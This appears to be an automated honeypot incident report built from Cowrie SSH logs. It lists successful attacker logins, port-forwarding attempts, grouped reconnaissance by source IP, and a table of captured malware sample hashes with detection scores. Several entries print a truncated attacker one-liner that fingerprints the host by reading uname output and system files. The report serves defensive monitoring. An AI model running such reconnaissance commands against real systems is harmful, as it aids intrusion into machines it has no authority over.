### 🔴 HIGH · IR-f9b20f3a3192

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:41 |
| **Last Seen** | 2026-08-03 22:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:41:38` | `cowrie.session.connect` |
| `2026-08-03 22:41:38` | `cowrie.client.version` |
| `2026-08-03 22:41:38` | `cowrie.client.kex` |
| `2026-08-03 22:41:41` | `cowrie.login.success` |
| `2026-08-03 22:41:43` | `cowrie.session.params` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.success` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:43` | `cowrie.command.input` |
| `2026-08-03 22:41:44` | `cowrie.log.closed` |
| `2026-08-03 22:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0660c3edc21

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-03 22:42 |
| **Last Seen** | 2026-08-03 22:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:42:34` | `cowrie.session.connect` |
| `2026-08-03 22:42:34` | `cowrie.client.version` |
| `2026-08-03 22:42:34` | `cowrie.client.kex` |
| `2026-08-03 22:42:36` | `cowrie.login.success` |
| `2026-08-03 22:42:37` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d17bb2129f

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-03 22:42 |
| **Last Seen** | 2026-08-03 22:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:42:46` | `cowrie.session.connect` |
| `2026-08-03 22:42:47` | `cowrie.client.version` |
| `2026-08-03 22:42:47` | `cowrie.client.kex` |
| `2026-08-03 22:42:49` | `cowrie.login.success` |
| `2026-08-03 22:42:50` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe63a4417057

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:43 |
| **Last Seen** | 2026-08-03 22:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:43:57` | `cowrie.session.connect` |
| `2026-08-03 22:43:58` | `cowrie.client.version` |
| `2026-08-03 22:43:58` | `cowrie.client.kex` |
| `2026-08-03 22:44:00` | `cowrie.login.success` |
| `2026-08-03 22:44:02` | `cowrie.session.params` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.success` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:02` | `cowrie.command.input` |
| `2026-08-03 22:44:03` | `cowrie.log.closed` |
| `2026-08-03 22:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f680008dacf

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 22:45 |
| **Last Seen** | 2026-08-03 22:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:45:47` | `cowrie.session.connect` |
| `2026-08-03 22:45:47` | `cowrie.client.version` |
| `2026-08-03 22:45:47` | `cowrie.client.kex` |
| `2026-08-03 22:45:48` | `cowrie.login.success` |
| `2026-08-03 22:45:48` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:45:48` | `cowrie.direct-tcpip.data` |
| `2026-08-03 22:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27eccfc40f15

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:46 |
| **Last Seen** | 2026-08-03 22:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:46:19` | `cowrie.session.connect` |
| `2026-08-03 22:46:19` | `cowrie.client.version` |
| `2026-08-03 22:46:19` | `cowrie.client.kex` |
| `2026-08-03 22:46:22` | `cowrie.login.success` |
| `2026-08-03 22:46:24` | `cowrie.session.params` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.success` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.command.input` |
| `2026-08-03 22:46:24` | `cowrie.log.closed` |
| `2026-08-03 22:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5600add3d0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:48 |
| **Last Seen** | 2026-08-03 22:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:48:36` | `cowrie.session.connect` |
| `2026-08-03 22:48:37` | `cowrie.client.version` |
| `2026-08-03 22:48:37` | `cowrie.client.kex` |
| `2026-08-03 22:48:40` | `cowrie.login.success` |
| `2026-08-03 22:48:42` | `cowrie.session.params` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.success` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:42` | `cowrie.command.input` |
| `2026-08-03 22:48:43` | `cowrie.log.closed` |
| `2026-08-03 22:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67583871923

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:50 |
| **Last Seen** | 2026-08-03 22:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:50:55` | `cowrie.session.connect` |
| `2026-08-03 22:50:55` | `cowrie.client.version` |
| `2026-08-03 22:50:55` | `cowrie.client.kex` |
| `2026-08-03 22:50:58` | `cowrie.login.success` |
| `2026-08-03 22:51:00` | `cowrie.session.params` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.success` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:00` | `cowrie.command.input` |
| `2026-08-03 22:51:01` | `cowrie.log.closed` |
| `2026-08-03 22:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94de1871f9d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:53 |
| **Last Seen** | 2026-08-03 22:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:53:16` | `cowrie.session.connect` |
| `2026-08-03 22:53:16` | `cowrie.client.version` |
| `2026-08-03 22:53:16` | `cowrie.client.kex` |
| `2026-08-03 22:53:18` | `cowrie.login.success` |
| `2026-08-03 22:53:20` | `cowrie.session.params` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.success` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:20` | `cowrie.command.input` |
| `2026-08-03 22:53:22` | `cowrie.log.closed` |
| `2026-08-03 22:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcba01f9ab36

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 22:54 |
| **Last Seen** | 2026-08-03 22:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:54:04` | `cowrie.session.connect` |
| `2026-08-03 22:54:04` | `cowrie.client.version` |
| `2026-08-03 22:54:04` | `cowrie.client.kex` |
| `2026-08-03 22:54:05` | `cowrie.login.success` |
| `2026-08-03 22:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caaf291ec276

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 22:54 |
| **Last Seen** | 2026-08-03 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:54:05` | `cowrie.session.connect` |
| `2026-08-03 22:54:05` | `cowrie.client.version` |
| `2026-08-03 22:54:05` | `cowrie.client.kex` |
| `2026-08-03 22:54:06` | `cowrie.login.success` |
| `2026-08-03 22:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bc6edcbfd9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 22:54 |
| **Last Seen** | 2026-08-03 22:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:54:11` | `cowrie.session.connect` |
| `2026-08-03 22:54:11` | `cowrie.client.version` |
| `2026-08-03 22:54:11` | `cowrie.client.kex` |
| `2026-08-03 22:54:11` | `cowrie.login.success` |
| `2026-08-03 22:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545a52d30778

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 22:54 |
| **Last Seen** | 2026-08-03 22:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:54:12` | `cowrie.session.connect` |
| `2026-08-03 22:54:12` | `cowrie.client.version` |
| `2026-08-03 22:54:12` | `cowrie.client.kex` |
| `2026-08-03 22:54:12` | `cowrie.login.success` |
| `2026-08-03 22:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-08-03 20:56 | 2026-08-03 22:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-08-03 21:01 | 2026-08-03 22:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-03 22:19 | 2026-08-03 22:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-03 22:33 | 2026-08-03 22:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-08-03 21:13 | 2026-08-03 21:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]94` | **2** | 2026-08-03 22:30 | 2026-08-03 22:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.209.85[.]215` | **2** | 2026-08-03 21:15 | 2026-08-03 21:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.44.161[.]32` | 1 | 2026-08-03 21:44 | 2026-08-03 21:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-03 21:36 | 2026-08-03 21:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.101.64[.]6` | 1 | 2026-08-03 21:03 | 2026-08-03 21:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]54` | 1 | 2026-08-03 20:56 | 2026-08-03 20:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-03 21:52 | 2026-08-03 21:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-08-03 21:08 | 2026-08-03 21:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-03 22:12 | 2026-08-03 22:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.87.69[.]161` | 1 | 2026-08-03 22:39 | 2026-08-03 22:40 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
